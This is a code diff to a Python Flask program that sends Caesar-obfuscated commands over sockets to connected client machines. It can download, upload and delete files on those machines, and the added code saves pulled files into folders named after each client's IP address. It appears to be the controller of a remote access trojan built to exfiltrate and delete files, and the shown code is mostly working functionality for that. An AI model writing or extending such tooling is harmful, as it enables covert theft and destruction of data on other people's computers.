@@ -5,10 +5,12 @@ from flask import Flask, request, send_file, render_template, send_from_director
 from threading import Thread
 import os, sys, time
 import easygui
+import errno
 import select
 import socket
 import logging
 import urllib.parse
+import select
 import math
 
 ADRESSE = "192.168.1.35"#socket.gethostname()
@@ -92,7 +94,51 @@ def interact() :
 
     match action :
         case "download" :
-           print(files) 
+            for i in files :
+                path = path_file_ex_2 + i
+                if i in FILES_ :
+                    #call download file
+                    client.send(CAESAR("download_file\0").encode())
+
+                    client.send(CAESAR(path + "\0").encode())
+                    
+                    time.sleep(0.05)
+                    addr = client.getpeername()[0]
+                    addr = os.getcwd() + "\\" + addr.replace(".","_")
+
+                    if not os.path.exists(addr):
+                        os.makedirs(addr)
+                   
+                    out_file = open(addr + "\\" + i, "wb")
+                    while True:
+                        try:
+                            # Receive data from the socket
+                            data = client.recv(4096)
+                            if not data:
+                                break
+
+                            # Write the data to the file
+                            out_file.write(data)
+                        except socket.error as e:
+                            if e.errno == errno.WSAEWOULDBLOCK:
+                                # If recv would block, wait until the socket is readable
+                                ready_to_read, _, _ = select.select([client], [], [], 1)
+                                if not ready_to_read:
+                                    # If select timed out, try recv again
+                                    continue
+                            else:
+                                break
+
+                    out_file.close()
+                    time.sleep(0.05)
+
+                else :
+                    #call download folder
+                    client.send(CAESAR("download_dir\0").encode())
+
+                    client.send(CAESAR(path + "\0").encode())
+
+                time.sleep(0.05)
 
         case "upload" :
             filename = easygui.fileopenbox()
@@ -110,15 +156,13 @@ def interact() :
                     client.send(CAESAR("del_file\0").encode())
 
                     client.send(CAESAR(path + "\0").encode())
-
-                    time.sleep(0.05)
                 else :
                     #call remove folder
                     client.send(CAESAR("del_dir\0").encode())
 
                     client.send(CAESAR(path + "\0").encode())
 
-                    time.sleep(0.05)
+                time.sleep(0.05)
 
     return 'ok'
 
